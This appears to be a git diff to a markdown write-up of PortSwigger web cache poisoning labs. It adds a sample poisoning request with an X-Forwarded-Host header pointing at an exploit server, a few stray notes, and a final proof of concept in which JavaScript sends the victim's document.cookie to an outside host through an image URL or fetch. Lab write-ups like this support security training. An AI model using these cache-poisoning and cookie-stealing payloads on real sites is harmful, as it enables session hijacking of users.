@@ -87,6 +87,30 @@ X-Forwarded-Host: your-exploit-server-id.web-security-academy.net
 13. To simulate the victim, reload the home page in your browser and make sure that the ``alert()`` fires.
 14. Keep replaying the request to keep the cache poisoned until the victim visits the site and the lab is solved.
 
+example:
+```bash
+GET /resources/js/tracking.js HTTP/2
+Host: blabla.web-security-academy.net
+Cookie: session=dmkTA3BT9tmM6ZFfZX6SwGicyIMxypiE
+User-Agent: summ
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Dnt: 1
+Sec-Gpc: 1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+X-Forwarded-Host: exploit-0a3900e60495791f80d4936101ac0095.exploit-server.net
+X-Forwarded-Scheme: nothttps
+
+
+```
+
 ## Targeted web cache poisoning using an unknown header
 Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header
 
@@ -169,6 +193,10 @@ Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-i
 ### Quick Solution
 The important thing here was to understand which param could be excluded from the cache key: always try with **UTM parameters**!
 
+tags:
+FAT GET workn't
+[object Object]
+
 <!-- omit in toc -->
 ### Solution
 1. Identify that the ``utm_content`` parameter is supported. Observe that it is also excluded from the cache key.
@@ -244,3 +272,15 @@ GET /random</p><script>alert(1)</script><p>foo
 3. Notice that if you request this URL in your browser, the payload doesn't execute because it is URL-encoded.
 4. In Burp Repeater, poison the cache with your payload and then immediately load the URL in your browser. This time, the ``alert()`` is executed because your browser's encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request.
 5. Re-poison the cache then immediately go to the lab and click "Deliver link to victim". Submit your malicious URL. The lab will be solved when the victim visits the link.
+
+FINAL PoC:
+```js
+document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />')
+```
+OR:
+fetch.
+example:
+```js
+fetch("https://exploit-0a9500a3042462a980280cb1019e008f.exploit-server.net/?c="+document['cookie'])
+```
+
